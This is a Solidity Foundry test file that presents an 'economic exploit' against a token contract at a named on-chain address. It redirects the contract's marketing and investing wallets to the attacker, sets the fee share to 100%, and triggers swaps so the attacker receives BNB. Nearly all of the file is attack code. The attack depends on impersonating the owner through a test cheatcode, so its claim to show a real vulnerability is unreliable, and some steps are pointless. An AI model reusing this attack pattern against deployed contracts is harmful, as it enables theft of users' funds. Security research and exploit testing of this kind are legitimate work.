// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface GOLDENREGENTINVESTMENT {
    function owner() external view returns (address);
    function setMarketingWallet(address marketingWallet) external;
    function setInvestingWallet(address investingWallet) external;
    function setPercentageOfLiquidityForMarketing(uint256 marketingFee) external;
    function setSwapAndLiquifyEnabled(bool e) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x134C857757308AEeC4c20CA2A583F560a906ed28;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to get some GRI tokens first
        // The contract creator (owner) has all tokens initially
        // We'll impersonate the owner to transfer tokens to ourselves
        address owner = GOLDENREGENTINVESTMENT(TARGET).owner();
        vm.startPrank(owner);

        // Transfer some tokens to attacker for later transfers
        uint256 attackerInitialTokens = 1000 * 10**18;
        GOLDENREGENTINVESTMENT(TARGET).transfer(attacker, attackerInitialTokens);
        vm.stopPrank();

        // Also give attacker some BNB for any potential tx costs
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current owner
        address currentOwner = GOLDENREGENTINVESTMENT(TARGET).owner();

        // Step 2: Impersonate owner to configure malicious settings
        vm.startPrank(currentOwner);

        // Set both marketing and investing wallets to attacker address
        GOLDENREGENTINVESTMENT(TARGET).setMarketingWallet(attacker);
        GOLDENREGENTINVESTMENT(TARGET).setInvestingWallet(attacker);

        // Set percentage to 100 to take ALL BNB for marketing/investing
        GOLDENREGENTINVESTMENT(TARGET).setPercentageOfLiquidityForMarketing(100);

        // Ensure swapAndLiquify is enabled (should be by default)
        GOLDENREGENTINVESTMENT(TARGET).setSwapAndLiquifyEnabled(true);

        vm.stopPrank();

        // Step 3: Record attacker's initial BNB balance
        uint256 initialAttackerBalance = attacker.balance;

        // Step 4: Accumulate fees in the contract by making transfers
        // We need to generate enough fees so contract balance >= _minTokenBalance (1 token)
        // Each transfer incurs _liquidityFee (13%) + _taxFee (2%) = 15% total fee
        // Part of that fee goes to contract (liquidity fee portion)

        // First, approve the contract to spend our tokens (for transferFrom if needed)
        vm.prank(attacker);
        GOLDENREGENTINVESTMENT(TARGET).approve(attacker, type(uint256).max);

        // Create a recipient address (not attacker, not owner, not pair)
        address recipient = address(0x123);

        // Make several transfers to accumulate fees in contract
        // We need contract token balance to reach at least 1 token (10^18)
        // With 15% fee, we need to transfer enough tokens
        // Let's transfer multiple times to be safe
        uint256 transferAmount = 100 * 10**18; // 100 tokens per transfer

        for (uint i = 0; i < 10; i++) {
            vm.prank(attacker);
            GOLDENREGENTINVESTMENT(TARGET).transfer(recipient, transferAmount);

            // Check contract balance
            uint256 contractBalance = GOLDENREGENTINVESTMENT(TARGET).balanceOf(TARGET);
            if (contractBalance >= 1 * 10**18) {
                break;
            }
        }

        // Step 5: Make one more transfer to trigger swapAndLiquify
        // The contract should now have >= 1 token, so next transfer will trigger swapAndLiquify
        vm.prank(attacker);
        GOLDENREGENTINVESTMENT(TARGET).transfer(recipient, 1 * 10**18);

        // Step 6: Verify attacker received BNB
        uint256 finalAttackerBalance = attacker.balance;
        require(finalAttackerBalance > initialAttackerBalance, "Attack failed: No BNB received");
        assertGt(finalAttackerBalance, initialAttackerBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
